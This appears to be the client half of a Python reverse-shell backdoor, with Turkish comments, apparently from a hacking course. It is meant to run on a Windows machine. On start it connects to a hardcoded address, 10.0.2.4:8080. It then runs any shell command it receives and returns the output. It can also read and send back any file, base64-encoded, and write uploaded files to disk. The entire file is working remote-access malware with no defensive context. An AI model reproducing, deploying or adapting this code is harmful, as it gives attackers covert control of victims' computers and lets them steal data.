import socket
import subprocess
import simplejson
import os
import base64

# Windowsta çalıştırılacak program.

class MySocket: 

	def __init__(self, ip, port):
		self.myConnection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Connection instance'ı oluşturuyoruz. AF_INET kullanarak ip port vererek bağlantı verme imkanımız oluyor.
		self.myConnection.connect((ip,port)) # Connection için 2 argümanı tuple içinde veriyoruz.

	def commandExecution(self,command):
		# call ile direkt kodu çalıştırıyoruz fakat check ile çalıştırınca sonucu da döndürüyoruz.
		return subprocess.check_output(command,shell = True) # Normalde liste halinde veriyoruz fakat string olarak vermek için shell = True parametresini verdik.

	def sendJson(self,data):
		jsonData = simplejson.dumps(data) # Veriyi JSON'a dönüştürdük.
		self.myConnection.send(jsonData.encode("utf-8")) # Bağlantı yolluyoruz.

	def receiveJson(self):
		jsonData = ""
		while True:
			try:
				jsonData = jsonData + self.myConnection.recv(1024).decode() # Bağlantıdan veri alabilmek için tanımladık. (Parametresi kaç bytelık bir veri olduğunu gösterir)
				return simplejson.loads(jsonData) # Veriyi normal haline çevirdik.
			except ValueError:
				continue

	def executeCDComment(self,directory):
		os.chdir(directory)
		return "cd to " + directory

	def readFile(self,path):
		with open(path,"rb") as myFile:
			return base64.b64encode(myFile.read()) # girilen pathdeki dosyayı okuduk ve çıktı olarak geri verdik.

	def writeFile(self,path,content): # İndirmeye çalıştığımız dosyanın içeriğini önce kendi dosyamıza yazıyoruz.
		with open(path,"wb") as myFile:
			myFile.write(base64.b64decode(content))
			return "Upload Finished!"

	def startConnection(self):
		while True:

			command = self.receiveJson()

			try:
				if command[0] == "quit":
					self.myConnection.close()
					exit()

				# Eğer inputun ilk kelimesi cd ise ve bu inputun birden fazla kelimesi varsa konumumuzu değiştireceğiz.(cd Documents gibi)
				elif command[0] == "cd" and len(command) > 1:
					commandOutput = self.executeCDComment(command[1])
					
				elif command[0] == "download":
					commandOutput = self.readFile(command[1]) 

				elif command[0] == "upload":
					commandOutput = self.writeFile(command[1],command[2]) # Listener'da yaptığımız append ile command[2]'nin içinde content olacaktır.

				else:
					commandOutput = self.commandExecution(command) # upload download veya cd yazılmamışsa sistemdeki (windowstaki) normal komutları çalıştırıyoruz.

				self.sendJson(commandOutput)

			except Exception:
				commandOutput = "An Error Occured!"

		self.myConnection.close()

mySocketListener = MySocket("10.0.2.4",8080)
mySocketListener.startConnection()